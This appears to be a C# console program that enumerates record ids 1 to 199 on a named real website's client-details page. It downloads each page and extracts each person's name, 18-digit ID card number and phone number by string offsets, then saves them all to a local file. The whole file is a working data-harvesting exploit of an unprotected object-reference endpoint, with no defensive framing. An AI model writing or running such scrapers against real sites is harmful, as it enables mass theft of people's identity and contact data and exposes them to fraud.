 class Program
    {
        static void Main(string[] args)
        {
            
            WebClient wc = new WebClient();

            StringBuilder result = new StringBuilder ();
            string data = "";
            for (int i = 1; i < 200; i++)
            {
                Uri uri = new Uri("http://sg.123123.com.cn/WebModules/Client/GroupClientDetails.aspx?id=" + i);

                try
                {
                    data = wc.DownloadString(uri);
                }
                catch (Exception )
                {
                    continue;

                }
                int nameIndex = data.IndexOf("lblxyxm");
                int cardIndex = data.IndexOf("lblsfzh");
                int phoneIndex = data.IndexOf("lblsj");
                string name = data.Substring(nameIndex + 9, 8);
                string card = data.Substring(cardIndex + 9, 18);
                string phone = data.Substring(phoneIndex + 7, 11);
                result.Append(name +"  " + card+"  " + phone+"      ");
                
            }

            StreamWriter sw = new StreamWriter("file.txt");
            sw.WriteLine(result);

            Console.WriteLine("done!");
            Console.ReadKey();
        }
    }